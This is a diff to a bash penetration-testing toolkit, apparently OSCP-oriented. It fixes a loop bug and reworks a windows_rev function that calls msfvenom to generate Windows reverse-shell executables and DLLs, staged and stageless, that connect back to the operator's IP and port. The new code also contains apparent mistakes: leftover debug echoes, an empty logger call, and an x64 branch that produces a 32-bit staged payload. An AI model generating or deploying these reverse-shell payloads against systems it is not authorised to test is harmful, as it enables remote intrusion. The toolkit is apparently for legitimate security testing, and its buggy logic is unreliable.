@@ -185,7 +185,7 @@ function find_category() {
         $match && return 0 || return 1
     }
 
-    for $condition in "$@"; do
+    for condition in "$@"; do
         for script in "$swiss_root/script/"*.sh; do
         while IFS= read -r line; do
             if [[ $line == *"Category:"* ]]; then
@@ -504,12 +504,20 @@ function listen() {
 # Example:
 #  windows_rev -p 4444 -a x86 -i
 # Category: [func:rce,target:windows]
+# Ref: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
+# Ref: https://github.com/rodolfomarianocy/OSCP-Tricks-2023/blob/main/shell_and_some_payloads.md
+# Todo: extends to Linux
 function windows_rev() {
-    swiss_logger info "[i] generating windows rev exe using msfvenom"
+    _helper() {
+        swiss_logger info "[i] generating windows rev exe using msfvenom"
+        swiss_logger info "Usage: gen_win_rev_exe <-a, --arch x86|x64|dll> [<-i, --ip IP] [-p, --port PORT]"
+    }
 
     local ip=$(get_default_network_interface_ip)
-    local port=""
-    local arch=""
+    local port="$_swiss_windows_rev_default_port"
+    local arch
+    local generate_stage=$_swiss_windows_rev_generate_stage
+    local generate_stageless=$_swiss_windows_rev_generate_stageless
 
     while [[ $# -gt 0 ]]; do
         case $1 in
@@ -527,27 +535,41 @@ function windows_rev() {
                 ;;
             *)
                 swiss_logger error "[e] Invalid option: $1"
-                swiss_logger info "Usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
+                _helper
                 return 1
                 ;;
         esac
     done
-
+    echo $port
+    echo $arch
     if [[ -z "$port" || -z "$arch" ]]; then
         swiss_logger error "[e] Port and architecture must be specified"
-        swiss_logger info "Usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
+        swiss_logger
         return 1
     fi
 
     case $arch in
         x86)
-            msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86.exe
+
+            if [[ $generate_stage = true ]]; then
+                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stage.exe
+            fi
+
+            if [[ $generate_stageless = true ]]; then
+                msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stageless.exe
+            fi
             ;;
         x64)
-            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64.exe
+            if [[ $generate_stage = true ]]; then
+                msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86-stage.exe
+            fi
+
+            if [[ $generate_stageless = true ]]; then
+                msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64-stageless.exe
+            fi
             ;;
         dll)
-            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o tzres.dll
+            msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o reverse.dll
             ;;
         *)
             swiss_logger error "[e] Invalid architecture: $arch. Only x86, x64, and dll are supported."
